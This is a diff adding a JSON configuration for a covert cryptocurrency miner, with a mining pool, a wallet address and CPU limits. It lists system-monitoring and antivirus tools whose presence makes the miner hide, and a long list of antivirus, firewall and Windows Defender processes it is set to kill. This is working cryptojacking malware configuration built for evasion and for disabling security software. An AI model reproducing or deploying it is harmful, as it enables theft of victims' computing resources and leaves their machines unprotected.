@@ -1,0 +1,15 @@
+{
+    "algo": "rx/0",
+    "pool": "pool.hashvault.pro",
+    "port": 80,
+    "wallet": "47LvGHqEhsBhE72fMSdoi2Dww74DvEbcwPaB4qoCseCfeWcxABiFnoDiYDaJiRHqnKf9YhjPnV9T6gasrBhNJJomSupDgGa",
+    "password": "",
+    "nicehash": false,
+    "ssltls": true,
+    "max-cpu": 20,
+    "idle-wait": 2,
+    "idle-cpu": 50,
+    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe,AnVir.exe,PLlhDBWxRt.exe,GPU-Z.exe,regedit.exe,Autoruns.exe,adwcleaner.exe,CCleaner64.exe,bitdefender.exe,kaspersky.exe,panda.exe,zoneAlarm.exe,Malwarebytes.exe,defender.exe,eset.exe,360.exe,IObit.exe,ffxiv.exe,ffxiv_dx11.exe,MSIAfterburner.exe",
+    "kill-targets": "afwServ.exe,aswEngSrv.exe,aswidsagent.exe,aswToolsSvc.exe,AvastSvc.exe,AvastSvc.exe,AvastUI.exe,wsc_proxy.exe,AvastBrowser.exe,AvastNM.exe,ashwebsv.exe,aswupdsv.exe,kavfswp.exe,kavtray.exe,kavfsmui.exe,kavshell.exe,kavfsrcn.exe,kavfs.exe,kavfsgt.exe,kavfswh.exe,kavfsscs.exe,efpeadm.exe,VPNGUI.exe,CVPND.exe,IPSECLOG.exe,cfp.exe,fsdfwd.exe,fsguiexe.exe,blackd.exe,kpf4gui.exe ,MSSCLL.exe,MCSHELL.exe,MPFSERVICE.exe,MPFAGENT.exe,nisum.exe,smc.exe,persfw.exe,pccpfw.exe,WINSS.exe,ZLCLIENT.exe,MCODS.exe,MCSHIELD.exe,msmpeng.exe,navapsvc.exe,avkwctl.exe,fsav32.exe,mcshield.exe,ntrtscan.exe,avguard.exe,ashServ.exe,AVENGINE.exe,avgemc.exe,tmntsrv.exe,ARestore.exe,asOELnch.exe,buVss.exe,cltLMH.exe,cltRT.exe,coInst.exe,coNatHst.exe,CpySnpt.exe,EFAInst64.exe,elaminst.exe,FLDgHost.exe,InstCA.exe,MCUI32.exe,Navw32.exe,ncolow.exe,NortonSecurity.exe,NSc.exe,nsWscSvc.exe,nuPerfScan.exe,RuleUp.exe,SEFInst.exe,Sevntx64.exe,SRTSP_CA.exe,SymDgnHC.exe,symerr.exe,SymVTCatalogDB.exe,tuIH.exe,uiStub.exe,uiWNSNotificationApp.exe,Upgrade.exe,vpnCA.exe,wa_3rd_party_host_32.exe,wa_3rd_party_host_64.exe,WFPUnins.exe,wpInstCA.exe,WSCStub.exe",
+    "stealth-fullscreen": true
+}
